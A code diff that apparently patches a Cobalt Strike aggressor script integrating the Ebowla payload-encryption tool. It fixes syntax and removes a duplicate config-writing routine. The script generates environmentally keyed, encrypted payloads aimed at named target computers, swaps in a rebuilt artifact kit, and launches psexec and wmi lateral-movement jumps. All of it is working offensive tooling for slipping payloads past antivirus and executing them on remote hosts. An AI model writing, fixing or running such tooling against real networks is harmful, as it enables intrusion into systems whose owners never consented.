@@ -107,7 +107,7 @@ sub ebowlaHelperConfigPopup {
 	} else {
 		[$comboBoxPayload setModel: $payloadTypeModelGo];
 	}
-	})];
+	},)];
 
 	[$payloadTypePanel add: $comboBoxPayload];
 	
@@ -207,59 +207,6 @@ sub dialog {
 		[$dialog setLocationRelativeTo: $__frame__];
 	return $dialog;
 }
-
-sub saveEbowlaConfig {
-	# Saves the ebowla configuration, calls ebowla, generates the payload, remove the config, then exits. Returns the payload:
-	#   saveEbowlaConfig(<path to input payload>, <output payload type>, <key iterations>, <minus bytes>, <payload type>, <Encryption Type>, <Rest of configuration>);
-	# 
-	# This is made as a sub so that these can be dynamically generated later
-
-	# Set the arguments
-	$inputPath = $1;
-	$outputPayloadType = $2;
-	$keyIter = $3;
-	$minusBytes = $4;
-	$payloadType = $5;
-	$encType = $6;
-	$ebowlaConfig = $7;
-
-	# Generate the temporary ebowla config
-	$handle = openf(">ebowlatmpconfig.config");
-	println($handle, "[Overall]");
-	println($handle, "\tEncryption_Type = " . $encType);
-	println($handle, "\toutput_type = " . $outputPayloadType);
-	println($handle, "\tminus_bytes = " . $minusBytes);
-	println($handle, "\tpayload_type = " . $payloadType);
-	println($handle, "\tkey_iterations = " . $keyIter);
-	println($handle, "\tclean_output = True\n");
-	println($handle, $ebowlaConfig);
-	closef($handle);
-
-	# Call ebowla and generate the payload:
-	#   This assumes that ebowla is in your $PATH as ebowla.py. I don't have a good workaround for this. 
-	$genEbowlaPayload = exec("ebowla.py " . $inputPath . " ebowlatmpconfig.config");
-	@pushPayloadGen = readAll($genEbowlaPayload);
-
-	# Remove the generated config
-	# Wait up to 10 seconds for the payload to be generated.
-	$returnValue = wait($genEbowlaPayload, 10 * 1000);
-	if ($returnValue == 0) {
-		$answer = search(@pushPayloadGen, &validPathCriteria);
-		if ($answer ne $null){
-			@generatedPathArray = split(': ', $answer, 2); 
-			show_message("Payload has been generated at: " . cwd() . "/output/" . @generatedPathArray[1]);
-		}
-		closef($genEbowlaPayload);
-	} else {
-		printAll(@pushPayloadGen);
-		show_error("Something went wrong when trying to generate payload. Please see Script Console for more info");
-		closef($genEbowlaPayload);
-	}
-
-	deleteFile("ebowlatmpconfig.config");
-}
-
-
 # Artifacts this will replace:
 # 	artifact32.dll
 # 	artifact32.exe
@@ -291,8 +238,8 @@ sub generateEbowlaPayloads{
 		# include default otp settings just in case
 		println($handle, "[otp_settings]\n\totp_type = key\n\tpad='cmd.exe'\n\tpad_max = 0xffffff\n\tscan_dir = 'c:\\windows\\sysnative'#'%APPDATA%'\n\tbyte_width = 9");
 		println($handle, "[symmetric_settings_win]\n\t[[ENV_VAR]]");
-		foreach $env_var in (keys(%ebowlaValues)){
-			foreach $value in (values(%ebowlaValues, $env_var)){
+		foreach $env_var (keys(%ebowlaValues)) {
+			foreach $value (values(%ebowlaValues, $env_var)){
 				println($handle, "\t\t" . $env_var . " = " . "'" . $value . "'");
 			}
 		}
@@ -342,7 +289,7 @@ sub processEbowlaConfig{
 	# Wait up to 10 seconds for the payload to be generated.
 	$returnValue = wait($genEbowlaPayload, 10 * 1000);
 	if ($returnValue == 0) {
-		$answer = search(@pushPayloadGen, &validPathCriteria);
+		$answer = search(@pushPayloadGen, &vaildPathCriteria);
 		if ($answer ne $null){
 			@generatedPathArray = split(': ', $answer, 2); 
 			$rtnPayload = cwd() . "/output/" . @generatedPathArray[1];
@@ -355,11 +302,11 @@ sub processEbowlaConfig{
 	}
 	# remove the generated config
 	deleteFile("ebowlatmpconfig.config");
-	return $rtnPayload
+	return $rtnPayload;
 }
 
 
-sub validPathCriteria{
+sub vaildPathCriteria{
 	return iff("[*] Writing" isin $1, "$1", $null); 
 }
 
@@ -445,12 +392,12 @@ popup targets{
 				# TODO: Determine how to grab username and domain from selected login
 				# $target_username = 
 				# $target_domain = 
-				wait(generateInitalArtifact);
+				wait(generateInitalArtifact());
 				# %ebowlaValues = %(computername => $target_name, username => $target_username, userdomain => $target_domain);
 				%ebowlaValues = %(computername => $target_name);
 				# Generates the Ebowla Payloads and artifact kit, and loads the newly-generated artifact kit.
 				%ebowlaPayloads = wait(generateEbowlaPayloads(%ebowlaValues));
-				wait(saveNLoadArtifactCNA);
+				wait(saveNLoadArtifactCNA());
 				# For execution of what was requested and wait for it to finish
 				#    Forking will create a new thread and script environment to ensure we
 				#    don't have any issue loading the new artifact kit
@@ -458,7 +405,8 @@ popup targets{
 				#    have to wait until each target selected responds to a response from openJumpDialog?
 				#    The other problem with this logic is that if you have multiple targets selected, then the user will have to use the Jump Dialog for every single target,
 				#    instead of the norm where they just select one jump and it applies to every target.
-				wait(fork(&executeJump, [$jmpType => $jmpType, $target => $target, %ebowlaPayloads => %ebowlaPayloads])));
+				$handle = fork(&executeJump, $jmpType => $jmpType, $target => $target, %ebowlaPayloads => %ebowlaPayloads);
+				wait($handle);
 				wait(rmrf("/tmp/fullbowla"));
 			}
 		}
@@ -470,12 +418,12 @@ popup targets{
 				# TODO: Determine how to grab username and domain from selected login
 				# $target_username = 
 				# $target_domain = 
-				wait(generateInitalArtifact);
+				wait(generateInitalArtifact());
 				# %ebowlaValues = %(computername => $target_name, username => $target_username, userdomain => $target_domain);
 				%ebowlaValues = %(computername => $target_name);
 				# Generates the Ebowla Payloads and artifact kit, and loads the newly-generated artifact kit.
 				%ebowlaPayloads = wait(generateEbowlaPayloads(%ebowlaValues));
-				wait(saveNLoadArtifactCNA);
+				wait(saveNLoadArtifactCNA());
 				# For execution of what was requested and wait for it to finish
 				#    Forking will create a new thread and script environment to ensure we
 				#    don't have any issue loading the new artifact kit
@@ -483,7 +431,8 @@ popup targets{
 				#    have to wait until each target selected responds to a response from openJumpDialog?
 				#    The other problem with this logic is that if you have multiple targets selected, then the user will have to use the Jump Dialog for every single target,
 				#    instead of the norm where they just select one jump and it applies to every target.
-				wait(fork(&executeJump, [$jmpType => $jmpType, $target => $target, %ebowlaPayloads => %ebowlaPayloads])));
+				$handle = fork(&executeJump, $jmpType => $jmpType, $target => $target, %ebowlaPayloads => %ebowlaPayloads);
+				wait($handle);
 				wait(rmrf("/tmp/fullbowla"));
 			}
 		}
@@ -495,12 +444,12 @@ popup targets{
 				# TODO: Determine how to grab username and domain from selected login
 				# $target_username = 
 				# $target_domain = 
-				wait(generateInitalArtifact);
+				wait(generateInitalArtifact());
 				# %ebowlaValues = %(computername => $target_name, username => $target_username, userdomain => $target_domain);
 				%ebowlaValues = %(computername => $target_name);
 				# Generates the Ebowla Payloads and artifact kit, and loads the newly-generated artifact kit.
 				%ebowlaPayloads = wait(generateEbowlaPayloads(%ebowlaValues));
-				wait(saveNLoadArtifactCNA);
+				wait(saveNLoadArtifactCNA());
 				# For execution of what was requested and wait for it to finish
 				#    Forking will create a new thread and script environment to ensure we
 				#    don't have any issue loading the new artifact kit
@@ -508,8 +457,10 @@ popup targets{
 				#    have to wait until each target selected responds to a response from openJumpDialog?
 				#    The other problem with this logic is that if you have multiple targets selected, then the user will have to use the Jump Dialog for every single target,
 				#    instead of the norm where they just select one jump and it applies to every target.
-				wait(fork(&executeJump, [$jmpType => $jmpType, $target => $target, %ebowlaPayloads => %ebowlaPayloads])));
+				$handle = fork(&executeJump, $jmpType => $jmpType, $target => $target, %ebowlaPayloads => %ebowlaPayloads);
+				wait($handle);
 				wait(rmrf("/tmp/fullbowla"));
+			}
 		}
 		item "wmi (psh)"{
 			local('$target $target_list $target_name $target_username $target_domain $jmpType');
@@ -519,12 +470,12 @@ popup targets{
 				# TODO: Determine how to grab username and domain from selected login
 				# $target_username = 
 				# $target_domain = 
-				wait(generateInitalArtifact);
+				wait(generateInitalArtifact());
 				# %ebowlaValues = %(computername => $target_name, username => $target_username, userdomain => $target_domain);
 				%ebowlaValues = %(computername => $target_name);
 				# Generates the Ebowla Payloads and artifact kit, and loads the newly-generated artifact kit.
 				%ebowlaPayloads = wait(generateEbowlaPayloads(%ebowlaValues));
-				wait(saveNLoadArtifactCNA);
+				wait(saveNLoadArtifactCNA());
 				# For execution of what was requested and wait for it to finish
 				#    Forking will create a new thread and script environment to ensure we
 				#    don't have any issue loading the new artifact kit
@@ -532,8 +483,10 @@ popup targets{
 				#    have to wait until each target selected responds to a response from openJumpDialog?
 				#    The other problem with this logic is that if you have multiple targets selected, then the user will have to use the Jump Dialog for every single target,
 				#    instead of the norm where they just select one jump and it applies to every target.
-				wait(fork(&executeJump, [$jmpType => $jmpType, $target => $target, %ebowlaPayloads => %ebowlaPayloads])));
+				$handle = fork(&executeJump, $jmpType => $jmpType, $target => $target, %ebowlaPayloads => %ebowlaPayloads);
+				wait($handle);
 				wait(rmrf("/tmp/fullbowla"));			
+			}	
 		}
 	}
 }
